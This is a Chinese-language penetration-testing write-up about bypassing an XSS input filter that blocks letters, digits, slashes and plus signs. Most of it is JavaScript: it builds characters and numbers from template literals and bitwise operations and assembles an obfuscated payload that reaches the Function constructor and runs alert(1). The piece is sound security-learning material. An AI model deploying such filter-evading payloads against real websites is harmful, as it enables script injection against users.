​	最近在一次渗透中遇到了一个XSS，整个过程比较有趣，故记录下来。

​	该漏洞的输入点在后端过滤了数字、字母和斜杠（/），而输出点的位置在script标签内的字符串变量声明里，我们只需构造一个'-payload-'这样的payload便可以触发XSS，首先可以想到的是利用JSFuck，但不幸的是，后端还过滤了加号（%2b），于是便有了这篇文章的思路。

` 注，该漏洞的绕过方式还有很多种，这里仅仅只是提供一种绕过思路，算是对JSFuck的学习和拓展。`

​	这里首先提供一个思路

```javascript
[]["constructor"]["constructor"]("alert(1)")() 
```

​	在这种情况下，我们只需要构造出"constructor\"以及payload的字符串即可触发XSS。一个有意思的玩法便是通过字符串模板来构造，当然这里离不开${}和反引号。用几个例子来展示一下：

```javascript
![]  //  false

`![]`  //  "![]"

`${![]}`  //  "false"
```

​	字符串模板中的占位符的执行优先级是高于反引号的，我们可以利用占位符得到我们想要的对象，再得到其字符串。

```javascript
`${!![]}`   //  "true"

`${![]}`  //  "false"

`${{}}`   //   "[object Object]"

`${[][[]]}`  //  "undefined"
```

​	已经得到这么多字符串的情况下，我们可以利用索引来获取我们想要的字符，但加号被过滤了，我们还有什么办法可以快速构造数字的呢？

​	JS是弱类型语言，我们仅需要简单的运算即可得到基础的数字：

```javascript
[]-[]  //  0    0b0

!![]-[]  //  1    0b1

!![]<<!![]  //  2    0b10

!![]<<!![]<<!![]  // 4    0b100
```

​	通过位运算符得到这些基础数字后，可以执行的操作就很多了，我使用的是或运算，实际情况中还可以考虑其他的运算符。

```javascript
(!![]<<!![]<<!![]<<!![]<<!![]<<!![]<<!![]<<!![])|(!![]<<!![]<<!![]<<!![]<<!![]<<!![]<<!![])|(!![]<<!![]<<!![]<<!![]<<!![]<<!![])|(!![]<<!![]<<!![]<<!![])|(!![]<<![])  //  233
```

​	剩下的就是构造payload的时候了，通过我们前面所说的`[]["constructor"]["constructor"]("alert(1)")() ` 思路，按部就班的做就可以了。

```javascript
`${{}}`[!![]<<!![]<<!![]|!![]-[]]   //  "c"

`${{}}`[!![]-[]]  //  "o"

`${[][[]]}`[!![]-[]]  //  "n"

`${![]}`[!![]-[]|!![]<<!![]]  //  "s"

`${!![]}`[[]-[]]  //  "t"

`${!![]}`[!![]-[]]  //  "r"

`${[][[]]}`[[]-[]]  //  "u"

`${{}}`[!![]<<!![]<<!![]|!![]-[]]   //  "c"

`${!![]}`[[]-[]]  //  "t"

`${{}}`[!![]-[]]  // "o"

`${!![]}`[!![]-[]]  //  "r"
```

​	拼接这些字符为一整个字符串。

```javascript
`${`${{}}`[!![]<<!![]<<!![]|!![]-[]]}${`${{}}`[!![]-[]]}${`${[][[]]}`[!![]-[]]}${`${![]}`[!![]-[]|!![]<<!![]]}${`${!![]}`[[]-[]]}${`${!![]}`[!![]-[]]}${`${[][[]]}`[[]-[]]}${`${{}}`[!![]<<!![]<<!![]|!![]-[]]}${`${!![]}`[[]-[]]}${`${{}}`[!![]-[]]}${`${!![]}`[!![]-[]]}`   //  "constructor"

['constructor']['constructor']('alert(1)')()
```

​	构造payload

```javascript
_=`${`${{}}`[!![]<<!![]<<!![]|!![]-[]]}${`${{}}`[!![]-[]]}${`${[][[]]}`[!![]-[]]}${`${![]}`[!![]-[]|!![]<<!![]]}${`${!![]}`[[]-[]]}${`${!![]}`[!![]-[]]}${`${[][[]]}`[[]-[]]}${`${{}}`[!![]<<!![]<<!![]|!![]-[]]}${`${!![]}`[[]-[]]}${`${{}}`[!![]-[]]}${`${!![]}`[!![]-[]]}`;

[][_][_](`${`${!![][~[]]}`[!!{}<<![]]}${`${!![][~[]]}`[!!{}<<!![]]}${`${![][~[]]}`[(!![]<<!![])|!![]]}${`${![][~[]]}`[!!{}<<![]]}${`${![][~[]]}`[!{}<<![]]}(${!!{}<<![]})`)()
```

​	简略的写法也可以写成这样

```javascript
([,__,,,,___,____]=`${{}}`,[_____,,,_________,,,______,,,,__________,___________,_______,,,________]=`${[][~[]]}${!![][~[]]}${![][~[]]}`)[_=`${___}${__}${______}${_______}${____}${________}${_____}${___}${____}${__}${________}`][_](`${__________}${___________}${_________}${________}${____}(${[]-[]})`)()
```

